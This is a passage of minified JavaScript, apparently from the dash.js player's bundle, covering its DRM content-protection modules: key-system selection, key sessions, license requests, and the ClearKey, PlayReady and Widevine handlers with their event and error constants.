w,h,F,P,O,R=(h=(w=L.debug).getLogger(D),F=L.eventBus,P=L.errHandler,(O=L.videoModel?L.videoModel.getElement():null)&&void 0===O.onencrypted||O&&void 0===O.mediaKeys?E(O,J)?(h.info("EME detected on this user agent! (ProtectionModel_3Feb2014)"),(0,r.default)(I).create({debug:w,eventBus:F,events:L.events,api:E(O,J)})):E(O,z)?(h.info("EME detected on this user agent! (ProtectionModel_01b)"),(0,x.default)(I).create({debug:w,eventBus:F,errHandler:P,events:L.events,api:E(O,z)})):(h.warn("No supported version of EME detected on this user agent! - Attempts to play encrypted content will fail!"),null):(h.info("EME detected on this user agent! (ProtectionModel_21Jan2015)"),(0,t.default)(I).create({debug:w,eventBus:F,events:L.events})));return!G&&R&&(G=(0,p.default)(I).create({protectionModel:R,protectionKeyController:N,eventBus:L.eventBus,debug:L.debug,events:L.events,BASE64:L.BASE64,constants:L.constants}),L.capabilities.setEncryptedMediaSupported(!0)),G}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(163)),l=v(u(164)),f=v(u(162)),g=v(u(169)),t=v(u(171)),r=v(u(172)),x=v(u(170)),z=[{generateKeyRequest:"generateKeyRequest",addKey:"addKey",cancelKeyRequest:"cancelKeyRequest",needkey:"needkey",keyerror:"keyerror",keyadded:"keyadded",keymessage:"keymessage"},{generateKeyRequest:"webkitGenerateKeyRequest",addKey:"webkitAddKey",cancelKeyRequest:"webkitCancelKeyRequest",needkey:"webkitneedkey",keyerror:"webkitkeyerror",keyadded:"webkitkeyadded",keymessage:"webkitkeymessage"}],J=[{setMediaKeys:"setMediaKeys",MediaKeys:"MediaKeys",release:"close",needkey:"needkey",error:"keyerror",message:"keymessage",ready:"keyadded",close:"keyclose"},{setMediaKeys:"msSetMediaKeys",MediaKeys:"MSMediaKeys",release:"close",needkey:"msneedkey",error:"mskeyerror",message:"mskeymessage",ready:"mskeyadded",close:"mskeyclose"}];m.__dashjs_factory_name="Protection",(u=Na.FactoryMaker.getClassFactory(m)).events=f.default,u.errors=g.default,Na.FactoryMaker.updateClassFactory(m.__dashjs_factory_name,u),M.default=u,da.exports=M.default},{162:162,163:163,164:164,169:169,170:170,171:171,172:172}],162:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");a:{for(var m=Object.getPrototypeOf(v.prototype),p="constructor",l=this,f=!0;f;){if(null===m&&(m=Function.prototype),void 0!==(f=Object.getOwnPropertyDescriptor(m,p))){if("value"in f){l=f.value;break a}if(void 0===(p=f.get))break;l=p.call(l);break a}if(null===(m=Object.getPrototypeOf(m)))break;f=!0}l=void 0}l.call(this),this.INTERNAL_KEY_MESSAGE="internalKeyMessage",this.INTERNAL_KEY_SYSTEM_SELECTED="internalKeySystemSelected",this.INTERNAL_KEY_STATUS_CHANGED="internalkeyStatusChanged",this.KEY_ADDED="public_keyAdded",this.KEY_ERROR="public_keyError",this.KEY_MESSAGE="public_keyMessage",this.KEY_SESSION_CLOSED="public_keySessionClosed",this.KEY_SESSION_CREATED="public_keySessionCreated",this.KEY_SESSION_REMOVED="public_keySessionRemoved",this.KEY_STATUSES_CHANGED="public_keyStatusesChanged",this.KEY_SYSTEM_ACCESS_COMPLETE="public_keySystemAccessComplete",this.KEY_SYSTEM_SELECTED="public_keySystemSelected",this.LICENSE_REQUEST_COMPLETE="public_licenseRequestComplete",this.NEED_KEY="needkey",this.PROTECTION_CREATED="public_protectioncreated",this.PROTECTION_DESTROYED="public_protectiondestroyed",this.SERVER_CERTIFICATE_UPDATED="serverCertificateUpdated",this.TEARDOWN_COMPLETE="protectionTeardownComplete",this.VIDEO_ELEMENT_SELECTED="videoElementSelected"}Object.defineProperty(M,"__esModule",{value:!0}),u=new(function(m,p){if("function"!=typeof p&&null!==p)throw new TypeError("Super expression must either be null or a function, not "+typeof p);m.prototype=Object.create(p&&p.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),p&&(Object.setPrototypeOf?Object.setPrototypeOf(m,p):m.__proto__=p)}(v,((u=u(55))&&u.__esModule?u:{default:u}).default),v),M.default=u,da.exports=M.default},{55:55}],163:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(r){function x(){if(!(Q&&Q.hasOwnProperty("on")&&O&&O.hasOwnProperty("getSupportedKeySystemsFromContentProtection")))throw Error("Missing config parameter(s)")}function z(ia,S){var V=p.default.getPSSHForKeySystem(pa,ia),oa=D(pa);if(V){ia=R.getAllInitData();for(var ba=0;ba<ia.length;ba++)if(O.initDataEquals(V,ia[ba]))return void B.warn("DRM: Ignoring initData because we have already seen it!");try{R.createKeySession(V,oa,L(pa),S)}catch(ha){Q.trigger(ja.KEY_SESSION_CREATED,{data:null,error:new t.default(g.default.KEY_SESSION_CREATED_ERROR_CODE,g.default.KEY_SESSION_CREATED_ERROR_MESSAGE+ha.message)})}}else ia?R.createKeySession(ia,oa,L(pa),S):Q.trigger(ja.KEY_SESSION_CREATED,{data:null,error:new t.default(g.default.KEY_SESSION_CREATED_ERROR_CODE,g.default.KEY_SESSION_CREATED_ERROR_MESSAGE+"Selected key system is "+(pa?pa.systemString:null)+".  needkey/encrypted event contains no initData corresponding to that key system!")})}function J(ia,S){x(),R.loadKeySession(ia,S,L(pa))}function E(ia){x(),ia?(R.setMediaElement(ia),Q.on(ja.NEED_KEY,F,this)):null===ia&&(R.setMediaElement(ia),Q.off(ja.NEED_KEY,F,this))}function D(ia){var S,V=null;return ia&&(S=ia.systemString,Z&&(V=S in Z?Z[S]:null)),V}function I(ia){var S=D(ia),V=[],oa=[],ba=S&&S.audioRobustness&&0<S.audioRobustness.length?S.audioRobustness:T,ha=S&&S.videoRobustness&&0<S.videoRobustness.length?S.videoRobustness:T;ia=L(ia);var ka=S&&S.distinctiveIdentifier?S.distinctiveIdentifier:"optional";return S=S&&S.persistentState?S.persistentState:"temporary"===ia?"optional":"required",Y.forEach((function(la){la.type===ma.AUDIO?V.push(new l.default(la.codec,ba)):la.type===ma.VIDEO&&oa.push(new l.default(la.codec,ha))})),new f.default(V,oa,ka,S,[ia])}function L(ia){return(ia=D(ia))&&ia.sessionType?ia.sessionType:na}function G(ia,S){var V=this,oa=[];ia=ia.sort((function(ka,la){return(Z&&Z[ka.ks.systemString]&&0<=Z[ka.ks.systemString].priority?Z[ka.ks.systemString].priority:ia.length)-(Z&&Z[la.ks.systemString]&&0<=Z[la.ks.systemString].priority?Z[la.ks.systemString].priority:ia.length)}));var ba,ha=void 0;if(pa)for(ha=0;ha<ia.length&&(pa!==ia[ha].ks||"break"!=(oa.push({ks:ia[ha].ks,configs:[I(pa)]}),Q.on(ja.KEY_SYSTEM_ACCESS_COMPLETE,(function C(la){Q.off(ja.KEY_SYSTEM_ACCESS_COMPLETE,C,V),la.error?S||Q.trigger(ja.KEY_SYSTEM_SELECTED,{error:new t.default(g.default.KEY_SYSTEM_ACCESS_DENIED_ERROR_CODE,g.default.KEY_SYSTEM_ACCESS_DENIED_ERROR_MESSAGE+la.error)}):(B.info("DRM: KeySystem Access Granted"),Q.trigger(ja.KEY_SYSTEM_SELECTED,{data:la.data}),ia[ha].sessionId?J(ia[ha].sessionId,ia[ha].initData):ia[ha].initData&&z(ia[ha].initData,ia[ha].cdmData))}),V),R.requestKeySystemAccess(oa),"break"));ha++);else void 0===pa?function(){function ka(fa){Q.off(ja.KEY_SYSTEM_ACCESS_COMPLETE,ka,V),fa.error?(pa=void 0,Q.off(ja.INTERNAL_KEY_SYSTEM_SELECTED,ba,V),S||Q.trigger(ja.KEY_SYSTEM_SELECTED,{data:null,error:new t.default(g.default.KEY_SYSTEM_ACCESS_DENIED_ERROR_CODE,g.default.KEY_SYSTEM_ACCESS_DENIED_ERROR_MESSAGE+fa.error)})):(C=fa.data,B.info("DRM: KeySystem Access Granted ("+C.keySystem.systemString+")!  Selecting key system..."),R.selectKeySystem(C))}pa=null,A.push(ia);for(var la=0;la<ia.length;la++)oa.push({ks:ia[la].ks,configs:[I(ia[la].ks)]});var C=void 0;ba=function va(qa){if(Q.off(ja.INTERNAL_KEY_SYSTEM_SELECTED,va,V),Q.off(ja.KEY_SYSTEM_ACCESS_COMPLETE,ka,V),qa.error)pa=void 0,S||Q.trigger(ja.KEY_SYSTEM_SELECTED,{data:null,error:new t.default(g.default.KEY_SYSTEM_ACCESS_DENIED_ERROR_CODE,g.default.KEY_SYSTEM_ACCESS_DENIED_ERROR_MESSAGE+"Error selecting key system! -- "+qa.error)});else if(R){pa=R.getKeySystem(),Q.trigger(ja.KEY_SYSTEM_SELECTED,{data:C}),(qa=D(pa))&&qa.serverCertificate&&0<qa.serverCertificate.length&&R.setServerCertificate(aa.decodeArray(qa.serverCertificate).buffer);for(var xa,za=0;za<A.length;za++)for(ha=0;ha<A[za].length;ha++)if(pa===A[za][ha].ks){O.isClearKey(pa)&&qa&&qa.hasOwnProperty("clearkeys")&&(xa={kids:Object.keys(qa.clearkeys)},A[za][ha].initData=(new TextEncoder).encode(JSON.stringify(xa))),A[za][ha].sessionId?J(A[za][ha].sessionId,A[za][ha].initData):null!==A[za][ha].initData&&z(A[za][ha].initData,A[za][ha].cdmData);break}}},Q.on(ja.INTERNAL_KEY_SYSTEM_SELECTED,ba,V),Q.on(ja.KEY_SYSTEM_ACCESS_COMPLETE,ka,V),R.requestKeySystemAccess(oa)}():A.push(ia)}function N(ia,S){Q.trigger(ja.LICENSE_REQUEST_COMPLETE,{data:ia,error:S})}function w(ia){ia.error?Q.trigger(ja.KEY_STATUSES_CHANGED,{data:null,error:ia.error}):B.debug("DRM: key status = "+ia.status)}function h(ia){B.debug("DRM: onKeyMessage");var S=ia.data;Q.trigger(ja.KEY_MESSAGE,{data:S});var V=S.messageType?S.messageType:"license-request",oa=S.message,ba=S.sessionToken;S=D(pa);var ha=pa?pa.systemString:null,ka=O.getLicenseServer(pa,S,V),la={sessionToken:ba,messageType:V};if(oa&&0!==oa.byteLength){if(!ka)return B.debug("DRM: License server request not required for this message (type = "+ia.data.messageType+").  Session ID = "+ba.getSessionID()),void N(la);if(O.isClearKey(pa)){var C=O.processClearKeyLicenseRequest(pa,S,oa);if(C)return B.debug("DRM: ClearKey license request handled by application!"),N(la),void R.updateKeySession(ba,C)}var fa,qa,va,xa,za,Ca,Ba,Ga,Ra;C=null,S&&S.serverURL?"string"==typeof(fa=S.serverURL)&&""!==fa?C=fa:"object"==typeof fa&&fa.hasOwnProperty(V)&&(C=fa[V]):C=S&&S.laURL&&""!==S.laURL?S.laURL:(C=pa.getLicenseServerURLFromInitData(p.default.getPSSHData(ba.initData)))||ia.data.laURL,(C=ka.getServerURLFromMessage(C,oa,V))?(va=!(qa={}),xa=function(La){if(La)for(var Ya in La)"authorization"===Ya.toLowerCase()&&(va=!0),qa[Ya]=La[Ya]},S&&xa(S.httpRequestHeaders),xa(pa.getRequestHeadersFromMessage(oa)),S&&"boolean"==typeof S.withCredentials&&(va=S.withCredentials),za=function(La,Ya,hb,bb){bb=La.response?ka.getErrorResponse(La.response,hb,bb):"NONE",N(Ya,new t.default(g.default.MEDIA_KEY_MESSAGE_LICENSER_ERROR_CODE,g.default.MEDIA_KEY_MESSAGE_LICENSER_ERROR_MESSAGE+hb+' update, XHR complete. status is "'+La.statusText+'" ('+La.status+"), readyState is "+La.readyState+".  Response is "+bb))},Ca=pa.getLicenseRequestFromMessage(oa),Ba=ka.getHTTPMethod(V),Ga=ka.getResponseType(ha,V),Ra=S&&!isNaN(S.httpTimeout)?S.httpTimeout:8e3,function Ab(Ya,hb,bb,Da,Pa,eb,Ta,qb,ib,mb,Db){var db=new XMLHttpRequest;for(var Za in db.open(bb,Ya,!0),db.responseType=Da,db.withCredentials=Pa,0<qb&&(db.timeout=qb),hb)db.setRequestHeader(Za,hb[Za]);var $a=function(){Ta--,setTimeout((function(){Ab(Ya,hb,bb,Da,Pa,eb,Ta,qb,ib,mb,Db)}),1e3)};db.onload=function(){200===this.status||0>=Ta?ib(this):(B.warn("License request failed ("+this.status+"). Retrying it... Pending retries: "+Ta),$a())},db.ontimeout=db.onerror=function(){0>=Ta?Db(this):(B.warn("License request network request failed . Retrying it... Pending retries: "+Ta),$a())},db.onabort=function(){mb(this)},db.send(eb)}(C,qa,Ba,Ga,va,Ca,3,Ra,(function(Ya){var hb;R&&(200===Ya.status&&null!==(hb=ka.getLicenseMessage(Ya.response,ha,V))?(N(la),R.updateKeySession(ba,hb)):za(Ya,la,ha,V))}),(function(Ya){N(la,new t.default(g.default.MEDIA_KEY_MESSAGE_LICENSER_ERROR_CODE,g.default.MEDIA_KEY_MESSAGE_LICENSER_ERROR_MESSAGE+ha+' update, XHR aborted. status is "'+Ya.statusText+'" ('+Ya.status+"), readyState is "+Ya.readyState))}),(function(Ya){N(la,new t.default(g.default.MEDIA_KEY_MESSAGE_LICENSER_ERROR_CODE,g.default.MEDIA_KEY_MESSAGE_LICENSER_ERROR_MESSAGE+ha+' update, XHR error. status is "'+Ya.statusText+'" ('+Ya.status+"), readyState is "+Ya.readyState))}))):N(la,new t.default(g.default.MEDIA_KEY_MESSAGE_NO_LICENSE_SERVER_URL_ERROR_CODE,g.default.MEDIA_KEY_MESSAGE_NO_LICENSE_SERVER_URL_ERROR_MESSAGE))}else N(la,new t.default(g.default.MEDIA_KEY_MESSAGE_NO_CHALLENGE_ERROR_CODE,g.default.MEDIA_KEY_MESSAGE_NO_CHALLENGE_ERROR_MESSAGE))}function F(ia,S){if(B.debug("DRM: onNeedKey"),"cenc"===ia.key.initDataType)if(0===Y.length&&(B.warn("DRM: onNeedKey called before initializeForMedia, wait until initialized"),5>(S=void 0===S?1:S+1)))H.push(setTimeout((function(){F(ia,S)}),500));else{var V=ia.key.initData;if(ArrayBuffer.isView(V)&&(V=V.buffer),pa){var oa=p.default.getPSSHForKeySystem(pa,V);if(oa)for(var ba=R.getAllInitData(),ha=0;ha<ba.length;ha++)if(O.initDataEquals(oa,ba[ha]))return void B.warn("DRM: Ignoring initData because we have already seen it!")}B.debug("DRM: initData:",String.fromCharCode.apply(null,new Uint8Array(V))),0!==(V=O.getSupportedKeySystems(V,Z)).length?G(V,!1):B.debug("DRM: Received needkey event with initData, but we don't support any of the key systems!")}else B.warn("DRM:  Only 'cenc' initData is supported!  Ignoring initData of type: "+ia.key.initDataType)}var P,O=(r=r||{}).protectionKeyController,R=r.protectionModel,Q=r.eventBus,ja=r.events,W=r.debug,aa=r.BASE64,ma=r.constants,H=[],B=void 0,A=void 0,Y=void 0,Z=void 0,na=void 0,T=void 0,pa=void 0;return P={initializeForMedia:function(ia){if(!ia)throw Error("mediaInfo can not be null or undefined");x(),Q.on(ja.INTERNAL_KEY_MESSAGE,h,this),Q.on(ja.INTERNAL_KEY_STATUS_CHANGED,w,this),Y.push(ia),(ia=O.getSupportedKeySystemsFromContentProtection(ia.contentProtection))&&0<ia.length&&G(ia,!0)},createKeySession:z,loadKeySession:J,removeKeySession:function(ia){x(),R.removeKeySession(ia)},closeKeySession:function(ia){x(),R.closeKeySession(ia)},setServerCertificate:function(ia){x(),R.setServerCertificate(ia)},setMediaElement:E,setSessionType:function(ia){na=ia},setRobustnessLevel:function(ia){T=ia},setProtectionData:function(ia){Z=ia,O.setProtectionData(ia)},getSupportedKeySystemsFromContentProtection:function(ia){return x(),O.getSupportedKeySystemsFromContentProtection(ia)},getKeySystems:function(){return O?O.getKeySystems():[]},setKeySystems:function(ia){O&&O.setKeySystems(ia)},stop:function(){R&&R.stop()},reset:function(){x(),Q.off(ja.INTERNAL_KEY_MESSAGE,h,this),Q.off(ja.INTERNAL_KEY_STATUS_CHANGED,w,this),E(null),pa=void 0,R&&(R.reset(),R=null),H.forEach((function(ia){return clearTimeout(ia)})),H=[],Y=[]}},B=W.getLogger(P),A=[],Y=[],na="temporary",T="",P}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(160)),l=v(u(182)),f=v(u(181)),g=v(u(169)),t=v(u(225));m.__dashjs_factory_name="ProtectionController",M.default=Na.FactoryMaker.getClassFactory(m),da.exports=M.default},{160:160,169:169,181:181,182:182,225:225}],164:[function(u,da,M){function v(D){return D&&D.__esModule?D:{default:D}}function m(){var D=this.context,I=void 0,L=void 0,G=void 0,N=void 0,w=void 0,h=void 0,F=void 0;return I={initialize:function(){N=[];var P=(0,t.default)(D).getInstance({BASE64:w});N.push(P),P=(0,g.default)(D).getInstance({BASE64:w}),N.push(P),P=(0,l.default)(D).getInstance({BASE64:w}),N.push(P),h=P,P=(0,f.default)(D).getInstance({BASE64:w,debug:L}),N.push(P),F=P},setProtectionData:function(P){for(var O,R,Q=0;Q<N.length;Q++){var ja=N[Q];ja.hasOwnProperty("init")&&ja.init((O=ja.systemString,R=void 0,R=null,P&&(R=O in P?P[O]:null),R))}},isClearKey:function(P){return P===h||P===F},initDataEquals:function(P,O){if(P.byteLength!==O.byteLength)return!1;P=new Uint8Array(P),O=new Uint8Array(O);for(var R=0;R<P.length;R++)if(P[R]!==O[R])return!1;return!0},getKeySystems:function(){return N},setKeySystems:function(P){N=P},getKeySystemBySystemString:function(P){for(var O=0;O<N.length;O++)if(N[O].systemString===P)return N[O];return null},getSupportedKeySystemsFromContentProtection:function(P){var O,Q,ja,R=void 0,W=[];if(P)for(Q=0;Q<N.length;++Q){var aa=N[Q];for(ja=0;ja<P.length;++ja)(R=P[ja]).schemeIdUri.toLowerCase()===aa.schemeIdURI&&(O=aa.getInitData(R),W.push({ks:N[Q],initData:O,cdmData:aa.getCDMData(),sessionId:aa.getSessionId(R)}))}return W},getSupportedKeySystems:function(P,O){var R=[];P=p.default.parsePSSHList(P);for(var Q,ja,W=0;W<N.length;++W)ja=(Q=N[W]).systemString,ja=!O||ja in O,Q.uuid in P&&ja&&R.push({ks:Q,initData:P[Q.uuid],cdmData:Q.getCDMData(),sessionId:Q.getSessionId()});return R},getLicenseServer:function(P,O,R){return"license-release"===R||"individualization-request"===R?null:(R=null,O&&O.hasOwnProperty("drmtoday")?R=(0,r.default)(D).getInstance({BASE64:w}):P.systemString===E.default.WIDEVINE_KEYSTEM_STRING?R=(0,z.default)(D).getInstance():P.systemString===E.default.PLAYREADY_KEYSTEM_STRING?R=(0,x.default)(D).getInstance():P.systemString===E.default.CLEARKEY_KEYSTEM_STRING&&(R=(0,J.default)(D).getInstance()),R)},processClearKeyLicenseRequest:function(P,O,R){try{return P.getClearKeysFromProtectionData(O,R)}catch(Q){return G.error("Failed to retrieve clearkeys from ProtectionData"),null}},setConfig:function(P){P&&(P.debug&&(L=P.debug,G=L.getLogger(I)),P.BASE64&&(w=P.BASE64))}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(160)),l=v(u(165)),f=v(u(167)),g=v(u(168)),t=v(u(166)),r=v(u(174)),x=v(u(175)),z=v(u(176)),J=v(u(173)),E=v(u(110));m.__dashjs_factory_name="ProtectionKeyController",M.default=Na.FactoryMaker.getSingletonFactory(m),da.exports=M.default},{110:110,160:160,165:165,166:166,167:167,168:168,173:173,174:174,175:175,176:176}],165:[function(u,da,M){function v(t){return t&&t.__esModule?t:{default:t}}function m(t){var r=(t=t||{}).BASE64;return{uuid:"e2719d58-a985-b3c9-781a-b030af78d30e",schemeIdURI:"urn:uuid:e2719d58-a985-b3c9-781a-b030af78d30e",systemString:g,getInitData:function(x){return f.default.parseInitDataFromContentProtection(x,r)},getRequestHeadersFromMessage:function(){return null},getLicenseRequestFromMessage:function(x){return new Uint8Array(x)},getLicenseServerURLFromInitData:function(){return null},getCDMData:function(){return null},getSessionId:function(){return null},getClearKeysFromProtectionData:function(x,z){var J=null;if(x){z=JSON.parse(String.fromCharCode.apply(null,new Uint8Array(z))),J=[];for(var E=0;E<z.kids.length;E++){var D=z.kids[E],I=x.clearkeys&&x.clearkeys.hasOwnProperty(D)?x.clearkeys[D]:null;if(!I)throw Error("DRM: ClearKey keyID ("+D+") is not known!");J.push(new p.default(D,I))}J=new l.default(J)}return J}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(179)),l=v(u(177)),f=v(u(160)),g=v(u(110)).default.CLEARKEY_KEYSTEM_STRING;m.__dashjs_factory_name="KeySystemClearKey",M.default=Na.FactoryMaker.getSingletonFactory(m),da.exports=M.default},{110:110,160:160,177:177,179:179}],166:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g){function t(){if(!x||!x.hasOwnProperty("decodeArray")||!x.hasOwnProperty("decodeArray"))throw Error("Missing config parameter(s)")}var r="utf-16",x=(g=g||{}).BASE64;return{uuid:"9a04f079-9840-4286-ab92-e65be0885f95",schemeIdURI:"urn:uuid:9a04f079-9840-4286-ab92-e65be0885f95",systemString:l,getInitData:function(z){var J,E,D,I=new Uint8Array([112,115,115,104,0,0,0,0]),L=new Uint8Array([154,4,240,121,152,64,66,134,171,146,230,91,224,136,95,149]),G=0,N=void 0,w=void 0;if(t(),!z)return null;if("pssh"in z)return p.default.parseInitDataFromContentProtection(z,x);if("pro"in z)z=x.decodeArray(z.pro.__text);else{if(!("prheader"in z))return null;z=x.decodeArray(z.prheader.__text)}return J=z.length,E=4+I.length+L.length+4+J,D=new ArrayBuffer(E),N=new Uint8Array(D),(w=new DataView(D)).setUint32(G,E),G+=4,N.set(I,G),G+=I.length,N.set(L,G),G+=L.length,w.setUint32(G,J),G+=4,N.set(z,G),N.buffer},getRequestHeadersFromMessage:function(z){var J={},E=new DOMParser;z=new("utf-16"===r?Uint16Array:Uint8Array)(z),z=String.fromCharCode.apply(null,z),E=(z=E.parseFromString(z,"application/xml")).getElementsByTagName("name"),z=z.getElementsByTagName("value");for(var D=0;D<E.length;D++)J[E[D].childNodes[0].nodeValue]=z[D].childNodes[0].nodeValue;return J.hasOwnProperty("Content")&&(J["Content-Type"]=J.Content,delete J.Content),J.hasOwnProperty("Content-Type")||(J["Content-Type"]="text/xml; charset=utf-8"),J},getLicenseRequestFromMessage:function(z){var J=null,E=new DOMParser,D=new("utf-16"===r?Uint16Array:Uint8Array)(z);return t(),D=String.fromCharCode.apply(null,D),(E=E.parseFromString(D,"application/xml")).getElementsByTagName("PlayReadyKeyMessage")[0]?((z=E.getElementsByTagName("Challenge")[0].childNodes[0].nodeValue)&&(J=x.decode(z)),J):z},getLicenseServerURLFromInitData:function(z){if(z)for(var J=new DataView(z),E=J.getUint16(4,!0),D=6,I=new DOMParser,L=0;L<E;L++){var G=J.getUint16(D,!0);D+=2;var N=J.getUint16(D,!0);if(D+=2,1===G){if(G=z.slice(D,D+N),G=String.fromCharCode.apply(null,new Uint16Array(G)),(G=I.parseFromString(G,"application/xml")).getElementsByTagName("LA_URL")[0]&&(N=G.getElementsByTagName("LA_URL")[0].childNodes[0].nodeValue))return N;if(G.getElementsByTagName("LUI_URL")[0]&&(G=G.getElementsByTagName("LUI_URL")[0].childNodes[0].nodeValue))return G}else D+=N}return null},getCDMData:function(){var z;if(t(),f&&f.cdmData){var J=[];for(z=0;z<f.cdmData.length;++z)J.push(f.cdmData.charCodeAt(z)),J.push(0);J=String.fromCharCode.apply(null,J),J=x.encode(J),J='<PlayReadyCDMData type="LicenseAcquisition"><LicenseAcquisition version="1.0" Proactive="false"><CustomData encoding="base64encoded">%CUSTOMDATA%</CustomData></LicenseAcquisition></PlayReadyCDMData>'.replace("%CUSTOMDATA%",J);var E=[];for(z=0;z<J.length;++z)E.push(J.charCodeAt(z)),E.push(0);return new Uint8Array(E).buffer}return null},getSessionId:function(z){return f&&f.sessionId?f.sessionId:z&&z.sessionId?z.sessionId:null},setPlayReadyMessageFormat:function(z){if("utf-8"!==z&&"utf-16"!==z)throw Error('Specified message format is not one of "utf-8" or "utf-16"');r=z},init:function(z){z&&(f=z)}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(160)),l=v(u(110)).default.PLAYREADY_KEYSTEM_STRING,f=void 0;m.__dashjs_factory_name="KeySystemPlayReady",M.default=Na.FactoryMaker.getSingletonFactory(m),da.exports=M.default},{110:110,160:160}],167:[function(u,da,M){function v(t){return t&&t.__esModule?t:{default:t}}function m(t){var r=t.BASE64,x=t.debug.getLogger(void 0);return{uuid:"1077efec-c0b2-4d02-ace3-3c1e52e2fb4b",schemeIdURI:"urn:uuid:1077efec-c0b2-4d02-ace3-3c1e52e2fb4b",systemString:g,getInitData:function(z){return f.default.parseInitDataFromContentProtection(z,r)},getRequestHeadersFromMessage:function(){return null},getLicenseRequestFromMessage:function(z){return new Uint8Array(z)},getLicenseServerURLFromInitData:function(){return null},getCDMData:function(){return null},getSessionId:function(){return null},getClearKeysFromProtectionData:function(z,J){var E=null;if(z){J=JSON.parse(String.fromCharCode.apply(null,new Uint8Array(J))),E=[];for(var D=0;D<J.kids.length;D++){var I=J.kids[D],L=z.clearkeys&&z.clearkeys.hasOwnProperty(I)?z.clearkeys[I]:null;if(!L)throw Error("DRM: ClearKey keyID ("+I+") is not known!");E.push(new p.default(I,L))}E=new l.default(E),x.warn("ClearKey schemeIdURI is using W3C Common PSSH systemID (1077efec-c0b2-4d02-ace3-3c1e52e2fb4b) in Content Protection. See DASH-IF IOP v4.1 section 7.6.2.4")}return E}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(179)),l=v(u(177)),f=v(u(160)),g=v(u(110)).default.CLEARKEY_KEYSTEM_STRING;m.__dashjs_factory_name="KeySystemW3CClearKey",M.default=Na.FactoryMaker.getSingletonFactory(m),da.exports=M.default},{110:110,160:160,177:177,179:179}],168:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f){var g=null,t=(f=f||{}).BASE64;return{uuid:"edef8ba9-79d6-4ace-a3c8-27dcd51d21ed",schemeIdURI:"urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed",systemString:l,init:function(r){r&&(g=r)},getInitData:function(r){return p.default.parseInitDataFromContentProtection(r,t)},getRequestHeadersFromMessage:function(){return null},getLicenseRequestFromMessage:function(r){return new Uint8Array(r)},getLicenseServerURLFromInitData:function(){return null},getCDMData:function(){return null},getSessionId:function(r){return g&&g.sessionId?g.sessionId:r&&r.sessionId?r.sessionId:null}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(160)),l=v(u(110)).default.WIDEVINE_KEYSTEM_STRING;m.__dashjs_factory_name="KeySystemWidevine",M.default=Na.FactoryMaker.getSingletonFactory(m),da.exports=M.default},{110:110,160:160}],169:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");a:{for(var m=Object.getPrototypeOf(v.prototype),p="constructor",l=this,f=!0;f;){if(null===m&&(m=Function.prototype),void 0!==(f=Object.getOwnPropertyDescriptor(m,p))){if("value"in f){l=f.value;break a}if(void 0===(p=f.get))break;l=p.call(l);break a}if(null===(m=Object.getPrototypeOf(m)))break;f=!0}l=void 0}l.call(this),this.MEDIA_KEYERR_CODE=100,this.MEDIA_KEYERR_UNKNOWN_CODE=101,this.MEDIA_KEYERR_CLIENT_CODE=102,this.MEDIA_KEYERR_SERVICE_CODE=103,this.MEDIA_KEYERR_OUTPUT_CODE=104,this.MEDIA_KEYERR_HARDWARECHANGE_CODE=105,this.MEDIA_KEYERR_DOMAIN_CODE=106,this.MEDIA_KEY_MESSAGE_ERROR_CODE=107,this.MEDIA_KEY_MESSAGE_NO_CHALLENGE_ERROR_CODE=108,this.SERVER_CERTIFICATE_UPDATED_ERROR_CODE=109,this.KEY_STATUS_CHANGED_EXPIRED_ERROR_CODE=110,this.MEDIA_KEY_MESSAGE_NO_LICENSE_SERVER_URL_ERROR_CODE=111,this.KEY_SYSTEM_ACCESS_DENIED_ERROR_CODE=112,this.KEY_SESSION_CREATED_ERROR_CODE=113,this.MEDIA_KEY_MESSAGE_LICENSER_ERROR_CODE=114,this.MEDIA_KEYERR_UNKNOWN_MESSAGE="An unspecified error occurred. This value is used for errors that don't match any of the other codes.",this.MEDIA_KEYERR_CLIENT_MESSAGE="The Key System could not be installed or updated.",this.MEDIA_KEYERR_SERVICE_MESSAGE="The message passed into update indicated an error from the license service.",this.MEDIA_KEYERR_OUTPUT_MESSAGE="There is no available output device with the required characteristics for the content protection system.",this.MEDIA_KEYERR_HARDWARECHANGE_MESSAGE="A hardware configuration change caused a content protection error.",this.MEDIA_KEYERR_DOMAIN_MESSAGE="An error occurred in a multi-device domain licensing configuration. The most common error is a failure to join the domain.",this.MEDIA_KEY_MESSAGE_ERROR_MESSAGE="Multiple key sessions were creates with a user-agent that does not support sessionIDs!! Unpredictable behavior ahead!",this.MEDIA_KEY_MESSAGE_NO_CHALLENGE_ERROR_MESSAGE="DRM: Empty key message from CDM",this.SERVER_CERTIFICATE_UPDATED_ERROR_MESSAGE="Error updating server certificate -- ",this.KEY_STATUS_CHANGED_EXPIRED_ERROR_MESSAGE="DRM: KeyStatusChange error! -- License has expired",this.MEDIA_KEY_MESSAGE_NO_LICENSE_SERVER_URL_ERROR_MESSAGE="DRM: No license server URL specified!",this.KEY_SYSTEM_ACCESS_DENIED_ERROR_MESSAGE="DRM: KeySystem Access Denied! -- ",this.KEY_SESSION_CREATED_ERROR_MESSAGE="DRM: unable to create session! --",this.MEDIA_KEY_MESSAGE_LICENSER_ERROR_MESSAGE="DRM: licenser error! --"}Object.defineProperty(M,"__esModule",{value:!0}),u=new(function(m,p){if("function"!=typeof p&&null!==p)throw new TypeError("Super expression must either be null or a function, not "+typeof p);m.prototype=Object.create(p&&p.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),p&&(Object.setPrototypeOf?Object.setPrototypeOf(m,p):m.__proto__=p)}(v,((u=u(52))&&u.__esModule?u:{default:u}).default),v),M.default=u,da.exports=M.default},{52:52}],170:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(z){function J(){O&&I();for(var 